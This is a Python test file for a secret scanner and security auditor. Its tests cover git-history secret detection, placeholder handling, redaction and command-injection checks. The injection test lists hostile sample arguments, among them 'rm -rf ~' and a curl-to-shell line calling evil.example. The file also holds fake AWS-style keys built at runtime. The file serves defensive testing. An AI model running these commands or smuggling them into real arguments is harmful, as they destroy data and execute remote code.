"""Regression tests for scanner defects found by sweeping a large set of repositories.

Token-shaped values are assembled at runtime so this file does not itself match
secret scanners.
"""

from __future__ import annotations

import json
import re
import subprocess
from pathlib import Path

import pytest
from typer.testing import CliRunner

from devguard.checkers.secret import SecretChecker
from devguard.cli import app
from devguard.sweeps.local_history_secrets import _scan_regex, scan_history_secrets
from devguard.sweeps.mcp_security_audit import _check_command_injection

AWS_KEY = "AKIA" + "Q3EGRZ7NV4XJ2W5T"
AWS_KEY_2 = "AKIA" + "M8HD2KQ5RT7WZ3VB"


@pytest.fixture(autouse=True)
def _isolate_git_config(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", "/dev/null")
    monkeypatch.setenv("GIT_CONFIG_SYSTEM", "/dev/null")


def _git(repo: Path, *args: str) -> str:
    done = subprocess.run(
        ["git", "-c", "user.name=t", "-c", "user.email=t@example.com", *args],
        cwd=repo,
        capture_output=True,
        text=True,
        check=True,
    )
    return done.stdout.strip()


def _commit(repo: Path, files: dict[str, str], message: str) -> str:
    for rel, text in files.items():
        target = repo / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(text)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", message)
    return _git(repo, "rev-parse", "HEAD")


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    path = tmp_path / "ws" / "repo"
    path.mkdir(parents=True)
    _git(path, "init", "-q", "-b", "main")
    return path


def test_history_regex_reads_non_ascii_and_spaced_file_names(repo: Path) -> None:
    _commit(
        repo,
        {"café.txt": f"k = {AWS_KEY}\n", "my file.txt": f"k = {AWS_KEY}\n", "a.py": f"{AWS_KEY}\n"},
        "add",
    )
    assert sorted(path for _rule, path, _c, _l in _scan_regex(repo, 60)) == [
        "a.py",
        "café.txt",
        "my file.txt",
    ]
    report, _ = scan_history_secrets(dev_root=repo.parent, max_depth=2, engine="regex")
    assert {f["file"]: f["in_head"] for f in report["findings"]} == {
        "a.py": True,
        "café.txt": True,
        "my file.txt": True,
    }


def test_history_regex_reports_the_commit_that_introduced_the_secret(repo: Path) -> None:
    first = _commit(repo, {"a.py": f"x = 1\nkey = '{AWS_KEY}'\n"}, "first")
    _commit(repo, {"a.py": f"x = 1\nkey = '{AWS_KEY}'\ny = 2\nother = '{AWS_KEY_2}'\n"}, "second")
    assert _scan_regex(repo, 60) == [("AWS Access Key", "a.py", first, 2)]


@pytest.mark.parametrize(
    "text",
    [
        "AKIA" + "X" * 16,
        "AKIA" + "IOSFODNN7" + "EXAMPLE",
        "AKIA" + "1234567890123456",
        "ghp_" + "x" * 36,
    ],
)
def test_history_regex_skips_documentation_placeholders(repo: Path, text: str) -> None:
    _commit(repo, {"docs/audit.md": f"The exposed key `{text}` was rotated.\n"}, "docs")
    assert _scan_regex(repo, 60) == []


def test_history_regex_keeps_a_real_key_beside_a_placeholder(repo: Path) -> None:
    _commit(repo, {"notes.md": f"AKIA{'X' * 16}\n{AWS_KEY}\n"}, "notes")
    assert [(rule, line) for rule, _p, _c, line in _scan_regex(repo, 60)] == [("AWS Access Key", 2)]


def test_key_in_a_tests_module_is_a_fixture(repo: Path) -> None:
    pem = "-----BEGIN " + "PRIVATE KEY-----\nMIIE\n"
    _commit(repo, {"src/auth/tests.rs": pem, "src/auth/key.rs": pem}, "add")
    report, _ = scan_history_secrets(dev_root=repo.parent, max_depth=2, engine="regex")
    assert {f["file"]: f["severity"] for f in report["findings"]} == {
        "src/auth/tests.rs": "low",
        "src/auth/key.rs": "high",
    }


def test_dirty_worktree_sweep_reports_missed_coverage_when_scanner_is_absent(
    repo: Path, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    _commit(repo, {"a.txt": "a\n"}, "first")
    (repo / "leak.txt").write_text(f"{AWS_KEY}\n")
    monkeypatch.setenv("PATH", str(Path(subprocess.check_output(["which", "git"]).decode()).parent))
    monkeypatch.chdir(tmp_path)
    result = CliRunner().invoke(
        app,
        [
            "sweep",
            "--repo",
            str(repo),
            "--only",
            "local_dirty_worktree_secrets",
            "--format",
            "json",
        ],
    )
    report = json.loads(result.stdout)["local_dirty_worktree_secrets"]
    if report["summary"]["findings_total"] == 0:
        # Nothing was scanned, so the run must not look clean.
        assert result.exit_code == 3, result.output


@pytest.mark.parametrize(
    "args",
    [
        ["--allowed-origins", "http://localhost:9090;http://127.0.0.1:9090"],
        ["--hosts", "localhost;127.0.0.1:8080"],
    ],
)
def test_url_list_argument_is_not_command_injection(args: list[str]) -> None:
    assert not _check_command_injection(["npx", *args])


@pytest.mark.parametrize(
    "arg",
    [
        "http://localhost; rm -rf ~",
        "a;curl http://evil.example|sh",
        "http://a;$(id)",
        "x; y",
        "server.js;",
    ],
)
def test_separator_with_a_command_is_still_command_injection(arg: str) -> None:
    assert _check_command_injection(["node", arg])


def _rules(text: str) -> set[str]:
    return {name for rx, name in SecretChecker.FALLBACK_PATTERNS if re.search(rx, text)}


def test_fallback_patterns_match_common_real_forms() -> None:
    secret = "wJalrXUtnFEMI" + "/K7MDENG/bPxRfiCY" + "zQ8vN2pL4sT6"
    assert "AWS Secret Key" in _rules(f"aws_secret_access_key = {secret}")
    assert "AWS Secret Key" in _rules(f'"AWS_SECRET_ACCESS_KEY": "{secret}"')
    assert "Generic API Key" in _rules('API_KEY="' + "a1" * 16 + '"')
    assert "Generic API Key" in _rules("api_key: " + "a1" * 16)
    assert "GitHub Token" in _rules("ghp_" + "a1B2" * 10)
    assert "Private Key" in _rules("-----BEGIN PGP " + "PRIVATE KEY BLOCK-----")
    assert "Private Key" in _rules("-----BEGIN OPENSSH " + "PRIVATE KEY-----")
    assert "Google API Key" in _rules("AIza" + "Sy" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q")
    assert "OpenAI API Key" in _rules("sk-" + "a1B2" * 12)
    assert _rules("the secret access key is stored elsewhere") == set()


def test_verified_secret_redaction_shows_at_most_a_prefix() -> None:
    checker = SecretChecker.__new__(SecretChecker)

    def described(raw: str) -> str:
        finding = {
            "Verified": True,
            "DetectorName": "AWS",
            "Raw": raw,
            "SourceMetadata": {"Data": {"Git": {"file": "a.env", "commit": "abc123456"}}},
        }
        vuln = checker._parse_finding(finding, Path("/tmp/repo"))
        return json.dumps(vuln.model_dump(mode="json")) if vuln else ""

    short = "hunter2xy"
    assert short not in described(short) and short[-4:] not in described(short)
    long = "AKIA" + "Q3EGRZ7NV4XJ2W5T" + "tailTAIL"
    assert long not in described(long) and "TAIL" not in described(long)
